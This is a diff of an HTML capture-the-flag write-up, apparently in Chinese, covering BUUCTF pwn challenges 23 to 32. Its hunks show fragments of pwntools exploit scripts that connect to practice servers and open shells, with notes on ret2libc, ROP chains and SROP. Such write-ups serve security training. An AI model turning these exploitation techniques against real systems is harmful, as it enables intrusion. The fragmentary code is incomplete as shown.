+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./bjdctf_2020_babystack2&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27593</span><span class="p">)</span>
@@ -1414,7 +1503,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412023609084" src="image-20250412023609084.png" /></p>
 <h2 id="23_jarvisoj_fm">题目23_jarvisoj_fm</h2>
 <ul>
@@ -1436,7 +1524,7 @@
 <p>接下来就直接写exp打</p>
 </li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./fm&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28823</span><span class="p">)</span>
@@ -1444,7 +1532,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412030134209" src="image-20250412030134209.png" /></p>
 <h2 id="24_bjdctf_2020_babyrop">题目24_bjdctf_2020_babyrop</h2>
 <ul>
@@ -1463,7 +1550,7 @@
 <ul>
 <li>直接<code>ret2libc</code>，exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./bjdctf_2020_babyrop&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26685</span><span class="p">)</span>
@@ -1492,7 +1579,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412031135239" src="image-20250412031135239.png" /></p>
 <h2 id="25_jarvisoj_tell_me_something">题目25_jarvisoj_tell_me_something</h2>
 <ul>
@@ -1511,7 +1597,7 @@
 <ul>
 <li>直接写<code>exp</code>：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./guestbook&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25255</span><span class="p">)</span>
@@ -1520,7 +1606,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412031613356" src="image-20250412031613356.png" /></p>
 <h2 id="26_ciscn_2019_es_2">题目26_ciscn_2019_es_2</h2>
 <ul>
@@ -1544,7 +1629,7 @@
 <li>但是没有<code>/bin/sh</code>这个字符串，所以我们需要将这个字符串写入到<code>bss</code>段中</li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./ciscn_2019_es_2&#39;)</span>
 <span class="c1">#libc = ELF(&#39;./libc-2.23.so&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29357</span><span class="p">)</span>
@@ -1562,7 +1647,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412035243591" src="image-20250412035243591.png" /></p>
 <h2 id="27_harekazectf2019baby_rop2">题目27_[HarekazeCTF2019]baby_rop2</h2>
 <ul>
@@ -1578,7 +1662,7 @@
 <li>直接打<code>ret2libc</code></li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="c1">#p = process(&#39;./babyrop2&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
@@ -1613,7 +1697,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412041218795" src="image-20250412041218795.png" /></p>
 <h2 id="28_picoctf_2018_rop-chain">题目28_picoctf_2018_rop chain</h2>
 <ul>
@@ -1642,7 +1725,7 @@
 <li>直接就是一步一步构造<code>32位rop链</code></li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="c1">#p = process(&#39;./PicoCTF_2018_rop_chain&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
@@ -1661,7 +1744,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412042043426" src="image-20250412042043426.png" /></p>
 <h2 id="29_pwn2_sctf_2016">题目29_pwn2_sctf_2016</h2>
 <ul>
@@ -1684,7 +1766,7 @@
 <ul>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="c1">#p = process(&#39;./pwn2_sctf_2016&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
@@ -1710,7 +1792,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <h2 id="30_jarvisoj_level3">题目30_jarvisoj_level3</h2>
 <ul>
 <li>考点：<code>ret2libc</code></li>
@@ -1729,7 +1810,7 @@
 <li>直接打<code>ret2libc</code></li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="c1">#p = process(&#39;./level3&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
@@ -1754,7 +1835,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412045053702" src="image-20250412045053702.png" /></p>
 <h2 id="31_wustctf2020_getshell">题目31_wustctf2020_getshell</h2>
 <ul>
@@ -1773,7 +1853,7 @@
 <ul>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="c1">#p = process(&#39;./wustctf2020_getshell&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
@@ -1782,7 +1862,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412045443966" src="image-20250412045443966.png" /></p>
 <h2 id="32_ciscn_2019_s_3">题目32_ciscn_2019_s_3</h2>
 <ul>
@@ -1802,7 +1881,7 @@
 <li>这边直接调用俩次<code>SROP</code>，在第一次调用<code>SROP</code>的时候顺便进行栈迁移，第二次<code>getshell</code></li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
 <span class="c1">#p = process(&#39;./ciscn_s_3&#39;)</span>
@@ -1838,7 +1917,6 @@
 
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412094752586" src="image-20250412094752586.png" /></p>
 
 
